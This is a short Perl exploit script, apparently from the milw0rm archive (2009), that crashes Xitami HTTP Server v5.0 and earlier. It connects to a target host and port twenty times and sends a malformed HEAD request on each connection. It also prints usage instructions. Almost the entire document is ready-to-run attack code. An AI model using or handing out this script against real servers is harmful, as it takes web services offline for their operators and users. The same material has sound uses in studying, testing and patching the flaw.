#!/usr/bin/perl
#
# Xitami HTTP Server <= v5.0 Remote Denial of Service.
#
# ------------------------------------------------------------------------------
# The vulnerability is caused due to an error with HEAD request and multi-socket
# This can be exploited to crash the HTTP service.
# ------------------------------------------------------------------------------
#
# Author: Jonathan Salwan
# Mail: submit [AT] shell-storm.org
# Web: http://www.shell-storm.org


use IO::Socket;
print "[+] Author : Jonathan Salwan\n";
print "[+] Soft   : Xitami HTTP Server v5.0\n";

	if (@ARGV < 1)
		{
 		print "[-] Usage: <file.pl> <host> <port>\n";
 		print "[-] Exemple: file.pl 127.0.0.1 80\n";
 		exit;
		}


	$ip 	= $ARGV[0];
	$port 	= $ARGV[1];

print "[+] Sending request...\n";


for($i=0;$i<20;$i++)
{
$socket = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$ip", PeerPort => "$port") || die "[-] Failed\n";

	print $socket "HEAD /% HTTP/1.0\r\n\r\n";
}

print "[+] Done!\n";

# milw0rm.com [2009-04-22]
